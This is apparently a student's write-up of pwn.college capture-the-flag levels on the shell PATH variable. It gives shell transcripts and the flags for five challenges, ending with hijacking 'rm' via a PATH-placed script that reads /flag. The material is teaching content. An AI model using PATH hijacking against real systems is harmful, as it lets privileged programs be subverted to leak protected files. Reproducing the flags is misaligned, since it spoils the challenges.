# Pondering PATH

## 1. The PATH Variable

### Solve
**Flag:** `pwn.college{sa4PPkvU3f7q00mhX0tshem81zM.QX2cDM1wiMwIzNzEzW}`

Had to remove the path for 'rm' command to prevent the program /challenge/run from deleting the flag.
```
~$ rm
rm: missing operand
Try 'rm --help' for more information.
hacker@path~the-path-variable:~$ PATH=""
hacker@path~the-path-variable:~$ rm
bash: rm: No such file or directory
hacker@path~the-path-variable:~$ /challenge/run
Trying to remove /flag...
/challenge/run: line 4: rm: No such file or directory
The flag is still there! I might as well give it to you!
pwn.college{sa4PPkvU3f7q00mhX0tshem81zM.QX2cDM1wiMwIzNzEzW}
```
### New Learnings
How to remove directory paths for commands.

## 2. Setting PATH

### Solve
**Flag:** `pwn.college{Epw3Uf80esXFH0zUDaWCOvi9cEG.QX1cjM1wiMwIzNzEzW}`

Had to set PATH /challenge/more_commands/ to allow /challenge/run to access 'win' command.
```
~$ PATH=/challenge/more_commands/
hacker@path~setting-path:~$ /challenge/run
Invoking 'win'....
Congratulations! You properly set the flag and 'win' has launched!
pwn.college{Epw3Uf80esXFH0zUDaWCOvi9cEG.QX1cjM1wiMwIzNzEzW}
```
### New Learnings
How to set a path to set a PATH to a specific command to it run it without specifying PATH every time.

## 3. Finding Commands

### Solve
**Flag:** `pwn.college{AypQcuXHTsqZ1uXCTFo612WYJZs.01NzEzNxwiMwIzNzEzW}`

Had to find the directory of 'win' command and then write the path to flag in order to read it.
```
~$ which win
/challenge/paths/21327/win
hacker@path~finding-commands:~$ cat /challenge/paths/21327/flag
pwn.college{AypQcuXHTsqZ1uXCTFo612WYJZs.01NzEzNxwiMwIzNzEzW}
```
### New Learnings
How to find the PATH of a command.

## 4. Adding Commands

### Solve
**Flag:** `pwn.college{c_nQ_WCJr6Be2xScxsyJEHlf4SZ.QX2cjM1wiMwIzNzEzW}`

I had to write a script win.sh which reads the /flag file and then added it to the PATH for /challenge/run. This way when /challenge/run is executed it finds win command and reads the flag.
```
~$ which cat
/run/dojo/bin/cat
hacker@path~adding-commands:~$ echo /run/dojo/bin/cat > win
hacker@path~adding-commands:~$ cat win
/run/dojo/bin/cat
hacker@path~adding-commands:~$ echo /run/dojo/bin/cat /flag >win
hacker@path~adding-commands:~$ cat win
/run/dojo/bin/cat /flag
hacker@path~adding-commands:~$ ls -l win
-rwxr-xr-x 1 hacker hacker 24 Oct  2 05:27 win
hacker@path~adding-commands:~$ PATH="/home/hacker/win"
hacker@path~adding-commands:~$ /challenge/run
Invoking 'win'....
/challenge/run: line 4: win: command not found
It looks like that did not work... Did you set PATH correctly?
hacker@path~adding-commands:~$ PATH="/home/hacker:$PATH"
hacker@path~adding-commands:~$ /challenge/run
Invoking 'win'....
pwn.college{c_nQ_WCJr6Be2xScxsyJEHlf4SZ.QX2cjM1wiMwIzNzEzW}
```
### New Learnings
How to write and add commands with shell scripts.

## 5. Hijacking Commands

### Solve
**Flag:** `pwn.college{0obyuqepqBGauKEf1jamOc8tFtc.QX3cjM1wiMwIzNzEzW}`

I had to write my own 'rm' command in the home directory that reads the flag instead of deleting it. The i reset the PATH to the home directory so that /challenge/flag can't access builtin rm. So i effectively hijacked the 'rm' command and the /challenge/run program gave me the flag instead of deleting it. 
```
~$ which cat
/run/dojo/bin/cat
hacker@path~hijacking-commands:~$ echo /run/dojo/bin/cat /flag > rm
hacker@path~hijacking-commands:~$ chmod a+x rm
hacker@path~hijacking-commands:~$ PATH="/home/hacker/"
hacker@path~hijacking-commands:~$ /challenge/run
Trying to remove /flag...
pwn.college{0obyuqepqBGauKEf1jamOc8tFtc.QX3cjM1wiMwIzNzEzW}
```
### New Learnings
How to hijack a builtin but writing my own script and rewriting PATH.

### References
None
